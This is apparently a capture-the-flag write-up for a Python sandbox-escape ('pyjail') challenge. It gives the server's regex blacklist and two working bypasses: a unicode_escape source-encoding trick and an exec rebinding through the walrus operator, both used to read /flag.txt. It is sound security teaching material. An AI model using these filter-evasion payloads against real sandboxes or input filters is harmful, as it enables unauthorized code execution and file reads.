# Python shell (misc, 943p, 77 solved)

## Description

```
Upload a Python file that can be run by invoking the python command, and we will run it for you. To do so, send the bytes over the stream, and close the write half. stdout will be sent back. For security reasons, we may refuse to run your file if we detect dangerous strings. There is a byte limit and a timeout.

nc misc.utctf.live 4353

The server takes the file, saves it, and runs it with python3 FILE. Consider how python3 FILE is different from cat FILE | python3.

This hint is for the intended solution. There are many ways to solve this problem.
```


## Task analysis

We have a classic pyjail to tackle.
The server is super unstable and we have to submit payloads a few times to get answers.
After some attempts we get back:

```
Blacklist: (eval)|(import)|(open)|(with)|(as)|(from)|(lambda)|(\s*print\s*=\s*)|(?P<paren>\()
Whitelist: (\s*print\s*(?P<paren>\())
```

So it's clear that some stuff are blacklisted and we can only call `print()`.

## Solution

There are at least 2 distinct ways to solve this problem.

### Source file encoding

First comes from the hint that they run the script as `python FILE`.
This implies we can use special tricks like set file encoding as in PEP 263.
We can submit:

```python
# coding: unicode_escape
\x70\x72\x69\x6e\x74\x28\x6f\x70\x65\x6e\x28\x27\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x2e\x72\x65\x61\x64\x28\x29\x29
```

to invoke
```python
print(open('/flag.txt').read())
```

### Blacklist bypass

Second way comes from missing things in the blacklist.
Specifically it contains neither `exec()` function, nor new `walrus operator`.
Walrus allows us to overwrite `print` symbol and `exec` allows to invoke arbitrary code.

```
p=print
if print:=exec:
    print('\x70\x28\x6f\x70\x65\x6e\x28\x27\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x2e\x72\x65\x61\x64\x28\x29\x29')
```

`utflag{unclean_input}`